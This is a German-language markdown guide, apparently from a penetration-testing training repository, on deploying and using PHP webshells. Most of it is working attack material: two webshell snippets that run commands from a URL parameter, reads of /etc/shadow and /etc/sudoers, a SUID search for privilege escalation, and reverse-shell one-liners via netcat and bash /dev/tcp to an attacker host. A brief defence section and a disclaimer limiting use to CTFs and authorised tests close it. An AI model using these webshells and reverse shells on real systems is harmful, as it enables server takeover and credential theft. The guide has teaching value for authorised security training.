# 🐚 PHP WebShell Usage Guide

## 📘 Kontext

Eine **PHP-Webshell** ist eine serverseitige Datei (z. B. `.php`), die einem Angreifer erlaubt, über den Browser Befehle auf dem Zielsystem auszuführen. Sie werden häufig in Penetration Tests, Capture-the-Flag (CTF)-Challenges oder Sicherheitsanalysen eingesetzt, um **Remote Code Execution (RCE)** nach einem erfolgreichen Upload-Angriff zu ermöglichen.

> ⚠️ **Wichtiger Hinweis:**  
> Dieses Wissen dient ausschließlich der **legalen Sicherheitsforschung**, für **CTFs**, **Testumgebungen** (wie HackTheBox/TryHackMe) oder autorisierte Penetration Tests. Jegliche nicht autorisierte Anwendung ist strafbar.

---

## 🛠️ Beispiel einer einfachen PHP Webshell

```php
<?php
  echo "<pre>";
  system($_GET['cmd']);
  echo "</pre>";
?>


⏳ Alternative mit exec()
php
<?php
  echo "<pre>";
  exec($_GET["cmd"], $out);
  echo htmlentities(join("\n", $out));
  echo "</pre>";
?>

Zugriff erfolgt z. B. über:
http://target/uploads/shell.php?cmd=whoami
```

---

## 🔍 Typische Webshell-Kommandos
Sobald du Zugriff auf die Shell hast, kannst du mit folgenden Befehlen arbeiten:

### 🧠 Informationsgewinnung
```bash
uname -a                 # Kernel & Systeminfo
id                       # Aktueller Benutzer & Gruppen
pwd                      # Aktuelles Verzeichnis
whoami                   # Benutzername
```

### 🗂️ Verzeichnisstruktur erkunden
```bash
ls -la /home             # Benutzerverzeichnisse
ls -la /root             # Root-Verzeichnis (Zugriff nur bei root)
ls -la /var/www          # Webserver-Verzeichnis
```

### 📝 Systemdateien lesen

```bash
cat /etc/passwd
cat /etc/shadow
cat /etc/sudoers
```

### 🌐 Netzwerk-Check
```bash
netstat -anp             # Ports & Prozesse
```

---

## 🔓 Privilege Escalation vorbereiten
Um weitere Rechte zu erlangen oder Root-Zugriff vorzubereiten:
```bash
find / -type f -perm -4000 2>/dev/null
which nc
which python
```
Mit einem gefundenen Tool kann eine Reverse Shell aufgebaut werden.

---

## 📤 Daten exfiltrieren oder Reverse Shell starten
Beispiel mit Netcat (wenn vorhanden):
```bash
nc [AttackerIP] [Port] -e /bin/bash
```

Oder über eine PHP-gestützte Reverse Shell:

```php
<?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>
```
> 🔁 Den Angriff auf Port 4444 lauschen: 
`nc -lvnp 4444`

---

## 🔐 Schutzmaßnahmen gegen PHP-Webshells
- Für Blue Teams oder Sysadmins:
    - Datei-Uploads strikt validieren (MIME, Magic-Bytes, Dateinamen).
    - Webserver konfigurieren, um Ausführung in Upload-Verzeichnissen zu verhindern.
    - .php, .phtml, .inc etc. blockieren oder als reine Textdateien behandeln.
    - Monitoring-Tools wie OSSEC, Wazuh, LMD (Linux Malware Detect) verwenden.

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!


---

## 📚 Siehe auch:

- [php_web_shell_bypass_tricks.md](/03-web-security/phpWebShell/php_web_shell_bypass_tricks.md)
- [post_exploitation_tools.md](/04-os-enumeration/post_exploitation_tools.md)
- [cmd_examples_from_shell.md](/03-web-security/phpWebShell/cmd_examples_from_shell.md)
- [php_rce_cheat_sheet.md](/03-web-security/phpWebShell/php_rce_cheat_sheet.md)
